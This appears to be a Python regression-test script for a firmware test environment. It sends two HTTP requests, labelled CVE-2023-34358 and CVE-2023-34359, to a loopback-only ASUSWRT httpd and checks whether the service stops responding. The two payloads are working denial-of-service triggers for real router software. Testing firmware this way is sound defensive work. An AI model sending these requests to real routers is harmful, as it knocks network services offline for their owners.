#!/usr/bin/env python3
"""Bounded, loopback-only RP-AX56 ASUSWRT httpd DoS regression probes."""

from __future__ import annotations

import argparse
import json
import socket
import time


REQUESTS = {
    "cve_2023_34358_body": (
        b"GET / HTTP/1.0\r\n"
        b"Host: 127.0.0.1\r\n"
        b"Content-Length: 1\r\n\r\n0"
    ),
    "cve_2023_34359_login": (
        b"GET /login.cgi HTTP/1.1\r\n"
        b"Host: 127.0.0.1\r\n"
        b"User-Agent: asusrouter-Windows-DUTUtil-1.0.1.278\r\n"
        b"Connection: close\r\n\r\n"
    ),
}


def exchange(port: int, request: bytes, timeout: float = 2.0) -> bytes:
    response = bytearray()
    with socket.create_connection(("127.0.0.1", port), timeout=timeout) as sock:
        sock.sendall(request)
        sock.shutdown(socket.SHUT_WR)
        while len(response) < 4096:
            try:
                chunk = sock.recv(4096 - len(response))
            except (ConnectionResetError, socket.timeout):
                break
            if not chunk:
                break
            response.extend(chunk)
    return bytes(response)


def live(port: int) -> bool:
    try:
        response = exchange(
            port,
            b"GET / HTTP/1.0\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n",
        )
    except OSError:
        return False
    return response.startswith(b"HTTP/")


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--case", choices=tuple(REQUESTS), required=True)
    args = parser.parse_args()
    if not 1 <= args.port <= 65535:
        parser.error("invalid port")

    before = live(args.port)
    if not before:
        raise SystemExit("loopback service is not live before probe")
    try:
        response = exchange(args.port, REQUESTS[args.case])
        error = None
    except OSError as exc:
        response = b""
        error = f"{type(exc).__name__}: {exc}"
    time.sleep(0.5)
    after = live(args.port)
    print(json.dumps({
        "target": f"127.0.0.1:{args.port}",
        "case": args.case,
        "baseline_live": before,
        "probe_response_bytes": len(response),
        "probe_response_prefix": response[:80].decode("latin-1", errors="replace"),
        "probe_error": error,
        "post_probe_live": after,
        "service_dos_observed": before and not after,
    }, indent=2))
    return 1 if before and not after else 0


if __name__ == "__main__":
    raise SystemExit(main())
